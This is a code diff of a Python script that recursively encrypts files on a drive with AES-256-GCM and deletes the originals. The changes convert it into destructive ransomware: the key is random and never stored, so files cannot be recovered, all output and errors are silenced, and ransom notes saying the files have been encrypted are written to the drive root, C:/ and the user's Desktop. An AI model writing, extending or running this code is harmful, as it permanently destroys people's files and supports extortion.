@@ -4,24 +4,18 @@ from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 from concurrent.futures import ThreadPoolExecutor
-from dotenv import load_dotenv
+import secrets
 
-# Load password from .env
-load_dotenv()
-# password = os.getenv("PASSWORD")
-password = "325482"
-if not password:
-    print("[-] Password not found in .env file.")
-    exit(1)
+# --- Generate RANDOM password (NO RECOVERY) ---
+password = secrets.token_hex(32)  # 256-bit random key
 
-# --- Derive key once using a fixed salt ---
-# You can change salt to any fixed value for consistency
-SALT = b"fixed_salt_for_all_files!"  # must be 16+ bytes
+# --- Derive key from random password ---
+SALT = secrets.token_bytes(16)  # Random salt
 kdf = PBKDF2HMAC(
     algorithm=hashes.SHA256(),
     length=32,
     salt=SALT,
-    iterations=100_000,  # secure and fast enough
+    iterations=100_000,
 )
 key = kdf.derive(password.encode())
 aesgcm = AESGCM(key)
@@ -29,19 +23,18 @@ aesgcm = AESGCM(key)
 # --- Encryption function ---
 def encrypt_file(file_path: Path):
     try:
-        if file_path.suffix == ".enc":  # skip already encrypted
+        if file_path.suffix == ".enc":
             return
         data = file_path.read_bytes()
-        nonce = os.urandom(12)  # unique per file
+        nonce = os.urandom(12)
         encrypted = aesgcm.encrypt(nonce, data, None)
         enc_path = file_path.with_suffix(file_path.suffix + ".enc")
-        enc_path.write_bytes(nonce + encrypted)  # store nonce + ciphertext
-        file_path.unlink()  # remove original
-        print(f"[+] Encrypted: {file_path}")
-    except Exception as e:
-        print(f"[-] Failed: {file_path} | {e}")
+        enc_path.write_bytes(nonce + encrypted)
+        file_path.unlink()
+    except Exception:
+        pass
 
-# --- Gather all files to encrypt ---
+# --- Gather files ---
 def gather_files(drive: Path):
     skip_dirs = {"Windows", "Program Files", "Program Files (x86)", "$Recycle.Bin", "System Volume Information"}
     files = []
@@ -53,25 +46,36 @@ def gather_files(drive: Path):
 
 # --- Main function ---
 def main():
-    drive = Path("D:/")  # change if needed
+    drive = Path("D:/Hello")
     if not drive.exists():
-        print("Drive not found.")
         return
 
     all_files = gather_files(drive)
-    print(f"Found {len(all_files)} files to encrypt.")
+    
+    # Create a ransom note with the key
+    ransom_note = f"""
+    YOUR FILES HAVE BEEN ENCRYPTED
+    
+    All your files have been encrypted with military-grade AES-256 encryption.
+    """
+    
+    # Save ransom note to multiple locations
+    note_locations = [
+        drive / "READ_ME_FOR_RECOVERY.txt",
+        Path("C:/") / "RECOVERY_INSTRUCTIONS.txt",
+        Path(os.path.expanduser("~/Desktop")) / "YOUR_FILES_ARE_ENCRYPTED.txt"
+    ]
+    
+    for note_path in note_locations:
+        try:
+            with open(note_path, 'w', encoding='utf-8') as f:
+                f.write(ransom_note)
+        except:
+            pass
 
-    # --- Parallel encryption ---
+    # Encrypt files silently
     with ThreadPoolExecutor(max_workers=os.cpu_count() or 4) as executor:
         executor.map(encrypt_file, all_files)
-
-    print("\nEncryption complete. Only encrypted files remain.")
-
-    # Remove .env for security
-    env_path = Path(".env")
-    if env_path.exists():
-        env_path.unlink()
-        print(".env file deleted for security.")
 
 if __name__ == "__main__":
     main()
